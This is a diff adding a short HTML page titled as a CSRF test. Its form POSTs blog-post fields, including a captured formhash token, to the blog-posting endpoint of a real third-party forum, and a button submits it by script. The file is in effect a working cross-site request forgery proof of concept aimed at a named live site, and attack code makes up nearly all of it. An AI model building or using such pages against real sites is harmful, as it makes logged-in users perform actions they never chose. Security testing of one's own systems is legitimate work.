@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>csrf测试</title>
+  </head>
+  <body>
+    <h1>hello</h1>
+    <form
+      action="https://bbs.zhue.com.cn/home.php?mod=spacecp&ac=blog_s&blogid="
+      method="POST"
+    >
+      <input type="text" name="subject" value="测试测试测试哟" />
+      <input type="text" name="savealbumid" value="0" />
+      <input type="text" name="newalbum" value="newalbum" />
+      <input type="text" name="view_albumid" value="none" />
+      <input type="text" name="message" value="测试一的内容" />
+      <input type="text" name="catid" value="1" />
+      <input type="text" name="tag" value="" />
+      <input type="text" name="friend" value="0" />
+      <input type="text" name="password" value="" />
+      <input type="text" name="selectgroup" value="0" />
+      <input type="text" name="target_names" value="" />
+      <input type="text" name="selectgroup" value="0" />
+      <input type="text" name="makefeed" value="1" />
+      <input type="text" name="dateline" value="2019/08/19 10:50" />
+      <input type="text" name="blogsubmit" value="true" />
+      <input type="text" name="formhash" value="5d49432d" />
+    </form>
+    <button onclick="submitForm()">点击提交</button>
+  </body>
+  <script>
+    function submitForm() {
+      document.forms[0].submit();
+    }
+  </script>
+</html>
